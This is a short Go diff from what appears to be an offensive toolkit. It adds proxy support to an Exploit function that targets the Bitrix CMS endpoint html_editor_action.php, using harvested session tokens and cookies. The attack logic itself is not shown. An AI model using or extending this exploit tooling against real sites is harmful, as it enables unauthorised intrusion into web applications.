@@ -3,17 +3,18 @@ package he
 import (
 	"bytes"
 	"fmt"
-	"io"
-	"net/http"
 	"github.com/indigo-sadland/quick-tricks/modules/tokens"
 	"github.com/indigo-sadland/quick-tricks/utils/colors"
+	"github.com/indigo-sadland/quick-tricks/utils/netclient"
+	"io"
+	"net/http"
 	"strings"
 )
 
 const endpoint = "/bitrix/tools/html_editor_action.php"
 
-func Exploit(target string) error {
-	compositeData, cookie, err := tokens.Get(target)
+func Exploit(target, proxy string) error {
+	compositeData, cookie, err := tokens.Get(target, proxy)
 	if err != nil {
 		return err
 	}
@@ -21,9 +22,15 @@ func Exploit(target string) error {
 		err = fmt.Errorf("Unable to access composite data.")
 		return err
 	}
-	var client http.Client
-	var reqBody string
+
+	client, err := netclient.NewHTTPClient(proxy)
+	if err != nil {
+		err = fmt.Errorf("Unable to parse proxy string: %s", err.Error())
+		return err
+	}
+
 	var i int
+	var reqBody string
 	bitrixSessid := compositeData.BitrixSessid
 	url := target + endpoint
 
